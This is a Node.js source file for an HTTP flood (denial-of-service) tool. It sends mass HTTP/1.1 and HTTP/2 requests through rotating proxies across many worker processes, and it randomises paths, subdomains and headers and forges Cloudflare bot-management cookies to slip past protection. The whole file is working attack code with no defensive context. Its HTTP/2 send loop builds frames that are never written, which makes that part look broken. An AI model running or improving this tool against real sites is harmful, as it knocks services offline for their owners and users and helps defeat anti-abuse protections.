const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const colors = require('colors');
const crypto = require('crypto');
const os = require('os');
const argv = require('minimist')(process.argv.slice(2));

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

const errorHandler = error => {
    console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
const statusesQ = []
let statuses = {}
const debugMode = process.argv.includes('--debug')
const targetT = argv['u'];
const timeT = argv['d'];
const threadsT = argv['t'];
const rateT = argv['r'];
const proxyT = argv['p'];

const randPathT = argv['j'];                // Random path
const randSDomainT = argv['i'];             // Random SubDomain exploit (for cf)
const reqmethodT = argv['m'] || "GET";      // Request method
const httpVersionT = argv['z'];             // HTTP version (1/2)
const randQueryT = argv['q'];               // Random Query String
const cleanModeT = argv['C'];               // Clean mode (without custom headers, etc)

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const urlT = new URL(targetT);

let proxy;
try {
    proxy = fs.readFileSync(proxyT, 'utf8').replace(/\r/g, '').split('\n');
} catch (e) {
    console.log(`Error: proxy file not loaded`);
    process.exit(1);
}

if (httpVersionT && ![1, 2].includes(httpVersionT)) {
    console.error('Error: http version only can 1/2');
    process.exit(1);
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethodT)) {
    console.error('Error: request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!targetT.startsWith('https://')) {
    console.error('Error: protocol can only https://');
    process.exit(1);
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);

    return Buffer.concat([frameHeader, statusCode]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randint(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const tls_ciphers = [
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256", "AES256-GCM-SHA384", "AES128-SHA", "AES256-SHA",
].join(":")

const uas_desktop = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
];

const languages = [
    "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
    "en-US,en;q=0.5"
];

const accept = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
];

const encoding = [
    "gzip, br"
];

const referer = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/"
];

const cacheControl = [
    "max-age=0",
    "no-cache",
    "no-store",
    "public, max-age=31536000"
];

const pragma = [
    "no-cache"
];

const dnt = [
    "1",
    "0"
];

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function h1builder(pathname) {
    let headers = `${reqmethodT} ${pathname} HTTP/1.1\r\n` +
        `Accept: ${accept[Math.floor(Math.random() * accept.length)]}\r\n` +
        `Accept-Encoding: ${encoding[Math.floor(Math.random() * encoding.length)]}\r\n` +
        `Accept-Language: ${languages[Math.floor(Math.random() * languages.length)]}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${urlT.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        "X-Requested-With: XMLHttpRequest\r\n" +
        `Referer: ${referer[Math.floor(Math.random() * referer.length)]}\r\n` +
        `Cache-Control: ${cacheControl[Math.floor(Math.random() * cacheControl.length)]}\r\n` +
        `Pragma: ${pragma[Math.floor(Math.random() * pragma.length)]}\r\n` +
        `DNT: ${dnt[Math.floor(Math.random() * dnt.length)]}\r\n` +
        `User-Agent: ${uas_desktop[Math.floor(Math.random() * uas_desktop.length)]}\r\n`

    headers += "\r\n";

    const result = Buffer.from(`${headers}`, 'binary');
    return result;
}

function go() {
    const parsedProxy = proxy[~~(Math.random() * proxy.length)].split(':');
    let authString = "";

    let finalProxyPayload = `CONNECT ${urlT.host}:443 HTTP/1.1\r\nHost: ${urlT.host}:443\r\nProxy-Connection: keep-alive\r\n\r\n`;

    if (parsedProxy[2] && parsedProxy[3]) {
        authString = Buffer.from(`${parsedProxy[2]}:${parsedProxy[3]}`).toString('base64');
        finalProxyPayload = `CONNECT ${urlT.host}:443 HTTP/1.1\r\nHost: ${urlT.host}:443\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: keep-alive\r\n\r\n`
    }

    let tlsSocket;

    if (!parsedProxy[0] || isNaN(parsedProxy[1])) {
        go()
        return
    }

    const netSocket = net.connect(Number(parsedProxy[1]), parsedProxy[0], () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: httpVersionT == 1 ? ['http/1.1'] : httpVersionT == 2 ? ['h2'] : httpVersionT === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: urlT.host,
                ecdhCurve: "X25519",
                ciphers: tls_ciphers,
                minVersion: 'TLSv1.1',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
            }, () => {
                let pathname = randPathT ? `${urlT.pathname}${randstr(6)}` : urlT.pathname;
                let authority = randSDomainT ? `${randint(1100, 1999)}-${randint(300, 900)}.${urlT.hostname}` : urlT.hostname;

                if (randQueryT) { pathname += `?${randstr(4)}=${randstr(6)}` };

                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    const http1Payload = Buffer.concat(new Array(1).fill(h1builder(pathname)));

                    if (httpVersionT == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                            //    console.log('HTTP/1.1 request sent');
                                setTimeout(() => {
                                    doWrite()
                                }, 50 + Math.random() * 200) // Random interval
                            } else {
                                console.error('Error sending HTTP/1.1 request', err);
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    return;
                }

                if (httpVersionT == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(10485760, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [4, 2097152],
                        [2, 0],
                        [3, 100000], // 100
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }

                            if (frame.type == 7 || frame.type == 5) {
       if (frame.type == 7) {
                                             if (!statuses["GOAWAY"])
                                                  statuses["GOAWAY"] = 0

                                             statuses["GOAWAY"]++
                                        }
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy())
                                tlsSocket.write(encodeFrame(0, 0x7, Buffer.from([0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8]), 0))
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = [];

                    for (let i = 0; i < rateT; i++) {
                        const pseudoHeaders = {
                            ":method": reqmethodT,
                            ":scheme": "https",
                            ":path": pathname,
                            ":authority": authority,
                        };

                        let regularHeaders;
                        let filteredRegularHeaders;
                        let shuffledRegularHeaders;
                        let headers;
                        let combinedHeaders;

                        if (cleanModeT) {
                            regularHeaders = {
                                "accept": `${accept[Math.floor(Math.random() * accept.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-site": "none" }),
                                "accept-encoding": `${encoding[Math.floor(Math.random() * encoding.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                "user-agent": `${uas_desktop[Math.floor(Math.random() * uas_desktop.length)]}`,
                                "accept-language": `${languages[Math.floor(Math.random() * languages.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                                "upgrade-insecure-requests": "1",
                                "referer": `${referer[Math.floor(Math.random() * referer.length)]}`,
                                "cache-control": `${cacheControl[Math.floor(Math.random() * cacheControl.length)]}`,
                                "pragma": `${pragma[Math.floor(Math.random() * pragma.length)]}`,
                                "dnt": `${dnt[Math.floor(Math.random() * dnt.length)]}`
                            };

                            filteredRegularHeaders = Object.entries(regularHeaders).filter(([, value]) => value != null);
                            shuffledRegularHeaders = shuffleArray(filteredRegularHeaders);

                            headers = Object.entries(pseudoHeaders).concat(shuffledRegularHeaders);

                            combinedHeaders = headers;

                        } else {
                            const newts = Date.now() / 1000;

                            regularHeaders = {
                                "accept": `${accept[Math.floor(Math.random() * accept.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-site": "none" }),
                                "accept-encoding": `${encoding[Math.floor(Math.random() * encoding.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                "user-agent": `${uas_desktop[Math.floor(Math.random() * uas_desktop.length)]}`,
                                "accept-language": `${languages[Math.floor(Math.random() * languages.length)]}`,
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                                "upgrade-insecure-requests": "1",
                                "referer": `${referer[Math.floor(Math.random() * referer.length)]}`,
                                "cache-control": `${cacheControl[Math.floor(Math.random() * cacheControl.length)]}`,
                                "pragma": `${pragma[Math.floor(Math.random() * pragma.length)]}`,
                                "dnt": `${dnt[Math.floor(Math.random() * dnt.length)]}`,

                                "cookie": `__cf_bm=${randstr(23)}_${randstr(19)}-${newts}-0-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(43)}-${newts}-1.0.1.0-${randstr(16)}_${randstr(11)}_${randstr(49)}_${randstr(7)}; path=${pathname}; HttpOnly; Secure; SameSite=None`
                            };

                            filteredRegularHeaders = Object.entries(regularHeaders).filter(([, value]) => value != null);
                            shuffledRegularHeaders = shuffleArray(filteredRegularHeaders);

                            headers = Object.entries(pseudoHeaders).concat(shuffledRegularHeaders);

                            const headers2 = Object.entries({
                                ...(Math.random() < 0.3 && { [`accept-proto-algo`]: `h2` }),
                                ...(Math.random() < 0.3 && { [`user-initial-height-viewed`]: `100%` }),
                                ...(Math.random() < 0.3 && { [`application-has-ui`]: `true` }),
                                ...(Math.random() < 0.3 && { [`user-fetch-theme`]: `?1` }),
                            }).filter(a => a[1] != null);

                            for (let i = headers2.length - 1; i > 0; i--) {
                                const j = Math.floor(Math.random() * (i + 1));
                                [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                            }

                            combinedHeaders = headers.concat(headers2);
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));

                        streamId += 2
                    }

                    

                }
                doWrite()
            }).on('error', (error) => {
                console.error('TLS socket error', error);
                tlsSocket.destroy()
            })
        })

        netSocket.write(finalProxyPayload);
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

if (cluster.isMaster) {
    const workers = {}

     Array.from({ length: threadsT }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

     cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
       });

     cluster.on('message', (worker, message) => {
          workers[worker.id] = [worker, message]
     })

if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

     setTimeout(() => process.exit(1), timeT * 1000);

} else {
     setInterval(() => { go() });
     if (debugMode) {
          setInterval(() => {
               if (statusesQ.length >= 4)
                    statusesQ.shift()

               statusesQ.push(statuses)
               statuses = {}
               process.send(statusesQ)
          }, 250)
     }
     setTimeout(() => process.exit(1), timeT * 1000);
}